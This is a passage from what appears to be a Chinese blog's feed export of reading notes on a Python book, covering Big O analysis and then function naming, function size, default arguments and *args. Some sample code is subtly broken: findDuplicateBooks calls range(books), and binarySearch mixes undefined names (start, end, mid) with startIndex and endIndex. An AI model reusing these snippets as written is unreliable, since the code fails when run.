1步</span><br></code></pre></td></tr></table></figure><p>该函数有一个<code>for</code>循环，但并非是对<code>books</code>列表的循环，无论<code>books</code>的大小如何，它都要执行20步。我们可以将步骤数改写为20(1)，去掉系数20后就变成了O(1)，即恒定的时间复杂度。这是对的，无论<code>books</code>列表的大小如何，该函数都需要相同的运行时间。</p><p>　　接下来，假设有一个<code>cheerForFavoriteBook()</code>函数，它的作用是在<code>books</code>中搜索一本最喜欢的书：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cheerForFavoriteBook</span>(<span class="hljs-params">books, favorite</span>):<br>    <span class="hljs-keyword">for</span> book <span class="hljs-keyword">in</span> books:                            <span class="hljs-comment"># 单次循环内的步骤数 * n</span><br>        <span class="hljs-built_in">print</span>(book)                               <span class="hljs-comment"># 1步</span><br>        <span class="hljs-keyword">if</span> book == favorite:                      <span class="hljs-comment"># 1步</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):                  <span class="hljs-comment"># 单次循环内的步骤数 * 100</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;THIS IS A GREAT BOOK!!!&#x27;</span>)  <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p><code>for book</code>循环在<code>books</code>列表上进行迭代，进行的步骤数为n乘以每次循环内的步骤数。该循环又包含了一个嵌套的<code>for i</code>循环，它迭代了100次。这意味着<code>for book</code>循环运行了102 x n次，也就是102n次。去掉系数后可以发现，<code>cheerForFavoriteBook()</code>仍然只是一个O(n)的线性操作。系数102看起来很大，怎么能忽略呢？但是请仔细想想：如果<code>favorite</code>压根儿不在<code>books</code>中，这个函数就只会运行1n步。系数的影响很不固定，所以它们对于算法复杂度的计算来说没有意义。</p><p>　　下一个示例，<code>findDuplicateBooks()</code>函数为每本书（线性操作）在<code>books</code>列表中搜索一次（也是线性操作）：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">def findDuplicateBooks(<span class="hljs-keyword">books):</span><br><span class="hljs-keyword"></span>    for i in range(<span class="hljs-keyword">books): </span>                    <span class="hljs-comment"># n步</span><br>        for <span class="hljs-keyword">j </span>in range(i + <span class="hljs-number">1</span>, <span class="hljs-keyword">books): </span>         <span class="hljs-comment"># n步</span><br>            if <span class="hljs-keyword">books[i] </span>== <span class="hljs-keyword">books[j]: </span>          <span class="hljs-comment"># 1步</span><br>                print(<span class="hljs-string">&#x27;Duplicate:&#x27;</span>, <span class="hljs-keyword">books[i]) </span> <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p><code>for i</code>循环遍历整个<code>books</code>列表，在每个循环内执行n步操作。<code>for j</code>循环对<code>books</code>列表的部分进行迭代，当去除系数时，也可以将其视为线性操作。也就是说，<code>for i</code>循环进行了n x n步操作，也就是n^2。这使得<code>findDuplicateBooks()</code>成为O(n^2)的多项式操作。</p><p>　　遇到嵌套循环并不都意味着它就是多项式操作，只有当两个循环都迭代n次时才是。这导致了n^2步，代表这是O(n^2)的操作。</p><p>　　来看一个具有挑战性的示例。前文提到过二分搜索算法，它的工作原理是在一个有序列表（我们称之为<code>haystack</code>）的中间位置检查是否存在某个特定的项目（我们称之为<code>needle</code>）。如果不存在，则继续搜索<code>haystack</code>的前一半或者后一半，这取决于待搜索项目的位置相较于中间位置的项目是更靠前还是更靠后。我们会不停重复这个过程，搜索一半的一半的一半……直到找到<code>needle</code>或者断定它不在<code>haystack</code>中。注意，二分搜索只有在列表中的项目是有序的时候才有效。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">binarySearch</span>(<span class="hljs-params">needle, haystack</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(haystack):                                        <span class="hljs-comment"># 1步</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>                                              <span class="hljs-comment"># 1步</span><br>    startIndex = <span class="hljs-number">0</span>                                               <span class="hljs-comment"># 1步</span><br>    endIndex = <span class="hljs-built_in">len</span>(haystack) - <span class="hljs-number">1</span>                                 <span class="hljs-comment"># 1步</span><br><br>    haystack.sort()                                              <span class="hljs-comment"># ???步</span><br><br>    <span class="hljs-keyword">while</span> start &lt;= end:                                          <span class="hljs-comment"># ???步</span><br>        midIndex = (startIndex + endIndex) // <span class="hljs-number">2</span>                  <span class="hljs-comment"># 1步</span><br>        <span class="hljs-keyword">if</span> haystack[midIndex] == needle:                         <span class="hljs-comment"># 1步</span><br>            <span class="hljs-comment"># 找到needle</span><br>            <span class="hljs-keyword">return</span> midIndex                                      <span class="hljs-comment"># 1步</span><br>        <span class="hljs-keyword">elif</span> needle &lt; haystack[midIndex]:                        <span class="hljs-comment"># 1步</span><br>            <span class="hljs-comment"># 搜索前一半</span><br>            endIndex = midIndex - <span class="hljs-number">1</span>                              <span class="hljs-comment"># 1步</span><br>        <span class="hljs-keyword">elif</span> needle &gt; haystack[mid]:                             <span class="hljs-comment"># 1步</span><br>            <span class="hljs-comment"># 搜索后一半</span><br>            startIndex = midIndex + <span class="hljs-number">1</span>                            <span class="hljs-comment"># 1步</span><br></code></pre></td></tr></table></figure><p>　　<code>binarySearch()</code>中有两行不易计算步数的代码。<code>haystack.sort()</code>调用的大O阶取决于Python的<code>sort()</code>方法内的代码。这段代码不容易找到，不过还是可以经网上查找得知它是O(n\log n)]操作。所有一般的排序函数至少是O(n\log n)]操作。13.5.3节将介绍几个常见的Python函数和方法的大O阶。</p><p>　　<code>while</code>循环不像之前我们看到的<code>for</code>循环那样容易分析。我们必须先了解二分搜索算法，确定该循环共有多少次迭代。在循环开始前，<code>startIndex</code>和<code>endIndex</code>分别在<code>haystack</code>的头和尾，<code>midIndex</code>被设置在<code>haystack</code>范围的中点。在<code>while</code>循环的每次迭代中，有两件可能发生的事情。如果<code>haystack[midIndex] == needle</code>，我们就找到了<code>needle</code>，函数会返回<code>needle</code>的索引。如果<code>needle &lt; haystack[midIndex]</code>或<code>needle &gt; haystack[midIndex]</code>，则将<code>startIndex</code>和<code>endIndex</code>所覆盖的范围减半。范围减半可以通过调整<code>startIndex</code>或<code>endIndex</code>来实现。我们将长度为n的列表分为一半的次数有\log_2(n)次（这是一个数学常识）。因此，<code>while</code>循环的阶数较大，是O(\log n)。</p><p>　　由于<code>haystack.sort()</code>行的O(n\log n)]阶大于O(\log n)阶，因此我们舍去较小的O(\log n)，整个<code>binarySearch()</code>函数为O(n\log n)]阶。如果可以保证<code>binarySearch()</code>只会在<code>haystack</code>为有序列表时调用，那就可以删除<code>haystack.sort()</code>行，使<code>binarySearch()</code>成为一个O(\log n)阶函数。从技术上看，这确实提高了函数的效率，但整个程序的效率并未提升，因为这种做法只是将必要的排序工作转移到了程序的其他部分。大多数二分搜索的实现省略了排序的步骤，因此二分搜索算法被视为具有O(\log n)的复杂度。</p><h3 id="13-5-3-常见函数调用的大O阶"><a href="#13-5-3-常见函数调用的大O阶" class="headerlink" title="13.5.3　常见函数调用的大O阶"></a>13.5.3　常见函数调用的大O阶</h3><p>　　对代码进行大O分析必须考虑它调用的任何函数的大O阶。如果它们是你写的，你当然可以直接分析自己的代码。但对于Python内置函数和方法的大O阶，你必须参考下面的列表。</p><p>　　这个列表包含了Python序列类型，比如字符串、元组和列表的一些常见操作的大O阶。</p><ul><li><strong><code>s[i]</code><strong>读和</strong><code>s[i] = value</code>赋值</strong>是O(1)操作。</li><li>**<code>s.append(value)</code>**是O(1)操作。</li><li>**<code>s.insert(i, value)</code>**是O(n)操作。在一个序列中插入值（特别是在前面）需要将索引大于<code>i</code>的所有项在序列中向后移动一个位置。</li><li>**<code>s.remove(value)</code>**是O(n)操作。从一个序列中移除值（特别是在前面）需要将索引大于<code>i</code>的所有项在序列中向前移动一个位置。</li><li>**<code>s.reverse()</code>**是O(n)操作，因为序列中的每一项都必须被重新排列。</li><li>**<code>s.sort()</code>**是O(n\log n)]操作，因为Python的排序算法具有O(n\log n)]阶。</li><li>**<code>value in s</code>**是O(n)操作，因为必须检查每一项。</li><li>**<code>for value in s</code>**是O(n)操作。</li><li>**<code>len(s)</code>**是O(1)操作，因为Python会额外记录一个序列中有多少项，所以当它被传递给<code>len()</code>时，不需要进行重新计算。</li></ul><p>　　下面这个列表包含了Python映射类型，比如字典、集合和不可变集合的一些常见操作的大O阶。</p><ul><li><strong><code>m[key]</code><strong>读和</strong><code>m[key] = value</code>赋值</strong>是O(1)操作。</li><li>**<code>m.add(value)</code>**是O(1)操作。</li><li>**<code>value in m</code>**对字典而言是O(1)操作，比在序列中使用快得多。</li><li>**<code>for key in m</code>**是O(n)操作。</li><li>**<code>len(m)</code>**是O(1)操作，因为Python会自动跟踪映射中的项数，所以当它被传递给<code>len()</code>时，不需要进行重复计算。</li></ul><p>　　列表需要从头到尾逐个搜索项，而字典使用键计算值的地址，查找某个键对应的值的时间是不变的。这种计算的过程被称为哈希算法，计算所得的地址则被称为哈希值。哈希算法超出了本书的范围，它是许多映射操作能保持O(1)恒定时间的原因所在。集合也会使用哈希算法，因为它本质上是只有键而非键−值对的字典。记住，将列表转换为集合是一个O(n)操作，所以先将列表转换为集合，再访问集合中的项对于提升效率而言毫无意义。</p><h3 id="13-5-4-一眼看出大O阶"><a href="#13-5-4-一眼看出大O阶" class="headerlink" title="13.5.4　一眼看出大O阶"></a>13.5.4　一眼看出大O阶</h3><p>　　一旦熟悉了大O分析，通常就不用按照步骤一步步做了。一段时间后，你就可以在代码中寻找一些蛛丝马迹以快速确定大O阶。</p><p>　　记住，n是代码处理的数据量。这里有一些通用规则。</p><ul><li>​    </li><li>如果代码不访问数据，阶数就是O(1)。</li><li>​    </li><li>如果代码遍历数据，阶数就是O(n)。</li><li>​    </li><li>如果代码有两个嵌套的循环，每个循环都对数据进行迭代，阶数就是O(n^2)。</li><li>​    </li><li>函数调用不能只算作一个步骤，而是要计算该函数内部代码的步骤。可以查阅13.5.3节。</li><li>​    </li><li>如果代码中存在重复将数据规模减半再处理的步骤，阶数就是O(\log n)。</li><li>​    </li><li>如果代码中对于数据中的每一项都有进行分治再处理的步骤，阶数就是O(n\log n)]。</li><li>​    </li><li>如果代码遍历数据中所有可能的值的组合，阶数就是O(2^n)或其他指数级。</li><li>​    </li><li>如果代码查看了数据中每个可能的值的排列组合，阶数就是O(n!)。</li><li>​    </li><li>如果代码涉及对数据排序，那么阶数至少是O(n\log n)]。</li></ul><p>　　这些规则可以当作很好的分析起点，但它们不能代替实际的大O分析。需要记住，大O阶不是对代码的速度快慢、是否高效的最终判断。思考下面这个<code>waitAnHour()</code>函数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br>def waitAnHour():<br>    <span class="hljs-type">time</span>.sleep(<span class="hljs-number">3600</span>)<br></code></pre></td></tr></table></figure><p>　　从技术上讲，<code>waitAnHour()</code>函数的时间复杂度是固定的O(1)。一般会认为固定时间复杂度的代码是快速的，但它的运行时间是一小时！这是否意味着这段代码效率低？不，实际上你不可能编写出一个运行时间比一小时还短的<code>waitAnHour()</code>函数。</p><p>　　大O并不是代码分析的全部，它的意义在于使你了解代码在遇到越来越多的输入数据时会有怎样的表现。</p><h3 id="13-5-5-当n很小时，大O并不重要，而n通常都很小"><a href="#13-5-5-当n很小时，大O并不重要，而n通常都很小" class="headerlink" title="13.5.5　当n很小时，大O并不重要，而n通常都很小"></a>13.5.5　当n很小时，大O并不重要，而n通常都很小</h3><p>　　掌握了大O记法的知识后，你可能迫不及待地想对你写的每一段代码进行分析。在你开始使用这个工具来敲掉眼中钉前，请记住，仅当有大量数据需要处理时，大O分析才有价值。而在现实问题中，数据量通常很小。</p><p>　　在这种情况下，费尽心思设计大O阶较低的复杂算法可能并不值得。Go语言编程设计者Rob Pike提出过5条关于编程的规则，其中一条就是“当n小的时候，花哨的算法会很慢，而n通常是小的”。大多数程序员不会面对大规模的数据中心或者复杂的计算，而是处理更普通的程序。在这种情况下，在分析器下运行代码会比进行大O分析产出更多有关代码性能的具体信息。</p><h2 id="13-6-小结"><a href="#13-6-小结" class="headerlink" title="13.6　小结"></a>13.6　小结</h2><p>　　Python标准库中有两个用于分析代码的模块：<code>timeit</code>和<code>cProfile</code>。<code>timeit.timeit()</code>函数在运行并对比小段代码的速度差异时比较有优势。而<code>cProfile.run()</code>函数可以为较大的函数编写出详细的报告，指出其瓶颈所在。</p><p>　　测量代码性能很重要，不要臆断。虽然可以使用巧妙的技巧来提升程序的效率，但这种做法可能会让程序更慢。为了避免花费不必要的时间优化程序中不重要的部分，阿姆达尔定律在数学上给出了解决方案，该公式描述了一个组件的效率提升对整个程序的增益。</p><p>　　大O是程序员在计算机科学中使用最广泛的实用概念。这需要一些数学知识才能理解，但明白一些基本概念就可以衡量代码是如何随着数据增长而变慢的，这并不需要进行大量的数字运算。</p><p>　　常见的大O阶有7种：O(1)，即恒定时间，指随着数据n的大小增长而不发生变化的代码；O(\log n)，即对数时间，指随着n翻倍而增加一步的代码；O(n)，即线性时间，描述的是随着n的增长成比例变慢的代码；O(n\log n)]，即线性对数时间，描述的是比O(n)慢一点的代码，许多排序算法是这个阶数；O(n^2)，即多项式时间（平方），指代码的运行时间以n输入数据的平方增加；O(2^n)，即指数时间；O(n!)，即阶乘时间。阶乘时间并不常见，但会出现在涉及组合或排列组合的时候。更高的阶数意味着更慢，因为运行时间的增长速度远大于其输入数据的大小。</p><p>　　需要注意，尽管大O已经是一个分析利器了，但它不能代替分析器，因为分析器可以运行代码以找出瓶颈所在，它仍是不可或缺的。但是，了解大O分析以及代码如何随着数据增长而变慢，可以让你避免编写本不该慢的代码。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之编写高效函数（十）</title>
    <link href="/2024/01/10/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BC%96%E5%86%99%E9%AB%98%E6%95%88%E5%87%BD%E6%95%B0%EF%BC%88%E5%8D%81%EF%BC%89/"/>
    <url>/2024/01/10/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BC%96%E5%86%99%E9%AB%98%E6%95%88%E5%87%BD%E6%95%B0%EF%BC%88%E5%8D%81%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="十-编写高效的函数"><a href="#十-编写高效的函数" class="headerlink" title="十　编写高效的函数"></a>十　编写高效的函数</h1><blockquote><p>　　函数就像是程序中的程序，通过拆分函数可以将代码分解成更小的单元。它能让我们不必编写重复的代码，减少错误的发生。但编写高效的函数要求我们在命名、大小、参数和复杂性等方面做出很多决策。本章将讲解编写函数的不同方法，分析各种取舍的利弊，深入探讨如何在函数的大小之间进行权衡，参数数量如何影响函数的复杂度，以及如何使用运算符<code>*</code>和<code>**</code>编写可变参数函数。本章还将讨论函数式编程范式以及按这种范式编写函数有何益处。</p></blockquote><h2 id="10-1-函数名"><a href="#10-1-函数名" class="headerlink" title="10.1　函数名"></a>10.1　函数名</h2><p>　　函数名称应该遵循一般标识符遵循的惯例，正如第4章所述。它通常包括一个动词，因为函数经常被用来执行某些动作。它也可以包含一个名词，用来描述被操作的事物，比如<code>refreshConnection()</code>、<code>setPassword()</code>和<code>extract_version()</code>，这些名字说明了函数的作用和目的。</p><p>　　对于类和模块中的方法而言，名称可能不需要名词。<code>SatelliteConnection</code>中的<code>reset()</code>方法和<code>webbrowser</code>模块中的<code>open()</code>函数都已经提供了必要的信息，能让人明白reset的对象是卫星连接，open的对象是网页浏览器。</p><p>　　尽量使用长的、具有描述性的名字，而不是缩写或者太短的名字。一个数学家也许能够立刻知道名为<code>gcd()</code>的函数会返回两个数字的最大公分母，但其他人会觉得<code>getGreatestCommonDenominator()</code>更容易理解。记住，不要使用Python内置的任何函数名或模块名，例如<code>all</code>、<code>any</code>、<code>date</code>、<code>email</code>、<code>file</code>、<code>format</code>、<code>hash</code>、<code>id</code>、<code>input</code>、<code>list</code>、<code>min</code>、<code>max</code>、<code>object</code>、<code>open</code>、<code>random</code>、<code>set</code>、<code>str</code>、<code>sum</code>、<code>test</code>和<code>type</code>。</p><h2 id="10-2-函数大小的权衡"><a href="#10-2-函数大小的权衡" class="headerlink" title="10.2　函数大小的权衡"></a>10.2　函数大小的权衡</h2><p>　　有些程序员说，函数应该尽可能简短，不要超过屏幕能容纳的长度。与长达几百行的函数相比，只有十几行的函数确实比较容易理解，但将大函数拆分成多个小函数也有缺点。</p><p>　　让我们先看看小函数的优点：</p><ul><li>函数的代码更容易理解；</li><li>函数可能需要较少的参数；</li><li>函数不太可能有副作用，如10.4.1节所述；</li><li>函数更容易测试和调试；</li><li>函数引发的不同种类的异常数量要少。</li></ul><p>　　但小函数也有缺点：</p><ul><li>编写简短的函数往往意味着程序中会有更多的函数；</li><li>拥有更多的函数意味着程序更加复杂；</li><li>拥有更多的函数也意味着必须想出更多的具有描述性的、准确的名称，这是一个难题；</li><li>使用更多的函数需要写更多的文档进行说明；</li><li>函数之间的关系会更复杂。</li></ul><p>　　有些人把“越短越好”的准则发挥到了极致，他们声称所有的函数最多只能有三四行代码。这太疯狂了。</p><h2 id="10-3-函数的形参和实参"><a href="#10-3-函数的形参和实参" class="headerlink" title="10.3　函数的形参和实参"></a>10.3　函数的形参和实参</h2><p>　　函数的形参是<code>def</code>语句括号中的变量名称，实参则是函数调用括号中的数值。函数的参数越多，代码的可配置性和通用性就越强，但更多的参数也意味着函数更复杂。</p><p>　　一个合适的准则是保持0～3个参数，参数超过6个可能就偏多了。当函数过于复杂时，最好考虑将其拆分成参数较少的多个小函数。</p><h3 id="10-3-1-默认参数"><a href="#10-3-1-默认参数" class="headerlink" title="10.3.1　默认参数"></a>10.3.1　默认参数</h3><p>　　降低参数复杂性的一个方法是为函数提供默认参数。默认参数是指在函数调用时如果没有指定参数，会用来代替参数的默认值。将大多数函数调用时使用的参数值作为默认参数可以避免在函数调用时重复输入。</p><p>　　默认参数的设定位置是在<code>def</code>语句中的参数名称和等号后。例如，在下面的<code>introduction()</code>函数中，如果函数调用时没有指定<code>greeting</code>参数的值，它的值就是默认参数值<code>&#39;Hello&#39;</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">introduction</span>(<span class="hljs-params">name, greeting=<span class="hljs-string">&#x27;Hello&#x27;</span></span>):<br><span class="hljs-meta">... </span>    <span class="hljs-built_in">print</span>(greeting + <span class="hljs-string">&#x27;, &#x27;</span> + name)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>introduction(<span class="hljs-string">&#x27;Alice&#x27;</span>)<br>Hello, Alice<br><span class="hljs-meta">&gt;&gt;&gt; </span>introduction(<span class="hljs-string">&#x27;Hiro&#x27;</span>, <span class="hljs-string">&#x27;Ohiyo gozaimasu&#x27;</span>)<br>Ohiyo gozaimasu, Hiro<br></code></pre></td></tr></table></figure><p>　　在调用<code>introduction()</code>时，如果不指定第2个参数，那么函数会默认使用字符串<code>&#39;Hello&#39;</code>。注意，带有默认值的参数需要排列在其他没有默认值的参数之后。</p><h3 id="10-3-2-使用-和-向函数传参"><a href="#10-3-2-使用-和-向函数传参" class="headerlink" title="10.3.2　使用*和**向函数传参"></a>10.3.2　使用<code>*</code>和<code>**</code>向函数传参</h3><p>　　可以使用<code>*</code>和<code>**</code>语法（通常读作star和star star）向函数传递一组参数。<code>*</code>语法允许你将一个可迭代对象（比如列表或元组）中的项作为参数逐个传入，<code>**</code>语法允许你将映射对象（如字典）中的键−值对作为参数逐个传入。</p><h3 id="10-3-3-使用-创建可变参数函数"><a href="#10-3-3-使用-创建可变参数函数" class="headerlink" title="10.3.3　使用*创建可变参数函数"></a>10.3.3　使用<code>*</code>创建可变参数函数</h3><p>　　在<code>def</code>语句中使用<code>*</code>语法可以创建可变参数函数，它可以接受不定数量的位置参数。举例来说，<code>print()</code>就是一个可变参数函数，因为你可以向它传递任意数量的字符串，比如<code>print(&#39;Hello!&#39;)</code>或<code>print(&#39;My name is&#39;，name)</code>。注意，10.3.2节是在函数调用中使用<code>*</code>语法，而本节是在函数定义中使用<code>*</code>语法。</p><p>来看一个示例，我们创建一个<code>product()</code>函数，它接受任意数量的参数，需要返回它们的乘积：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">product</span>(<span class="hljs-params">*args</span>)：<br><span class="hljs-meta">... </span>    result = <span class="hljs-number">1</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> args：<br><span class="hljs-meta">... </span>        result *= num<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> result<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>product(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>)<br><span class="hljs-number">9</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>product(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>在函数内部，<code>args</code>只是一个包含所有位置参数的普通Python元组。从技术角度讲，这个参数可以叫任何名字，只要以<code>*</code>开头即可，但惯例是将其命名为<code>args</code>。</p><p>　　什么时候使用<code>*</code>语法是需要思考的，毕竟创建可变参数函数还有另一个替代方案，即接受一个列表类型（或者其他可迭代数据类型）作为单一参数，列表内部包含数量不定的项。内置的<code>sum()</code>函数就是这样一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sum</span>([<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])<br><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>　　<code>sum()</code>函数接受一个可迭代参数，传递多个参数时会出现异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">sum</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-built_in">sum</span>() takes at most <span class="hljs-number">2</span> arguments (<span class="hljs-number">4</span> given)<br></code></pre></td></tr></table></figure><p>　　而内置函数<code>min()</code>和<code>max()</code>（分别用来寻找多个值中的最小值和最大值）既可以接受一个可迭代参数，也可以接受多个独立的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">min</span>([<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>])<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">min</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>)<br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">max</span>([<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>])<br><span class="hljs-number">8</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">max</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>)<br><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>这些函数都接受不定数量的参数，为什么它们的参数设计成不同的模式？什么时候应该把函数设计成只接受一个可迭代参数，什么时候又该使用<code>*</code>语法接受多个独立参数呢？</p><p>　　如何设计参数取决于我们预测程序员会如何使用我们的代码。<code>print()</code>函数之所以需要多个参数，是因为程序员经常向它传递一连串的字符串或包含字符串的变量，比如<code>print(&#39;My name is&#39;, name)</code>。把这些字符串归纳成一个列表，再将列表传递给<code>print()</code>的做法并不常见。<code>print()</code>已经被设计成在接受列表作为参数时完整地打印该列表的值，所以不能把它设计成逐个打印列表中的单个值。</p><p>　　<code>sum()</code>函数没理由接受独立的参数，因为Python提供的<code>+</code>运算符可以达到同样的目的。你可以直接写<code>2 + 4 + 8</code>这样的代码，而不必写<code>sum(2, 4, 8)</code>。不定数量的参数只能作为列表传递给<code>sum()</code>是合理的。</p><p>　　<code>min()</code>函数和<code>max()</code>函数允许两种风格的传参。如果只传递了一个参数，该函数会假定它是一个待检查的列表或元组；如果传递了多个参数，则假定它们是待检查的值。这两个函数既需要用于程序运行时处理值的列表，如函数调用<code>min(allExpenses)</code>，也需要处理程序员挑选的多个参数，比如<code>max(0, someNumber)</code>。所以这些函数被设计成接受两种参数。下面的<code>myMinFunction()</code>是我对<code>min()</code>函数的另一种实现，它展示了如何同时处理两种风格的传参：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">myMinFunction</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">1</span>:<br>       values = args[<span class="hljs-number">0</span>] ❶<br>    <span class="hljs-keyword">else</span>:<br>       values = args ❷<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(values) == <span class="hljs-number">0</span>:<br>       <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;myMinFunction() args is an empty sequence&#x27;</span>) ❸<br><br>    <span class="hljs-keyword">for</span> i, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(values): ❹<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> value &lt; smallestValue:<br>            smallestValue = value<br>    <span class="hljs-keyword">return</span> smallestValue<br></code></pre></td></tr></table></figure><p><code>myMinFunction()</code>使用<code>*</code>语法接受元组形式且数量不定的参数。如果这个元组只有一个值，那么我们假定这个值是待检查的值的序列❶。否则，假定<code>args</code>是待检查的元组❷。无论何种情况，<code>values</code>变量都将包含一个值序列，供后续代码检查。与真实的<code>min()</code>函数一样，如果调用者没有传递任何参数或者传递了空序列，函数就会抛出<code>ValueError</code>❸。剩余代码的作用是遍历序列并返回找到的最小值❹。简单地说，<code>myMinFunction()</code>只接受列表或元组这两类序列，而不接受任何可迭代的值。</p><p>　　你可能会疑惑为什么我们不总是将函数设计为接受两种传递不定参数的方式。我的回答是，函数应该尽量简单。除非两种调用方式都很常见，否则应该只支持一种而放弃另一种。如果函数通常接受的是程序运行时创建的数据结构，那么最好设计成接受单个参数。如果通常接受的是程序员在编写代码时指定的参数，那么最好使用<code>*</code>语法接受不定数量的参数。</p><h3 id="10-3-4-使用-创建可变参数函数"><a href="#10-3-4-使用-创建可变参数函数" class="headerlink" title="10.3.4　使用**创建可变参数函数"></a>10.3.4　使用<code>**</code>创建可变参数函数</h3><p>　　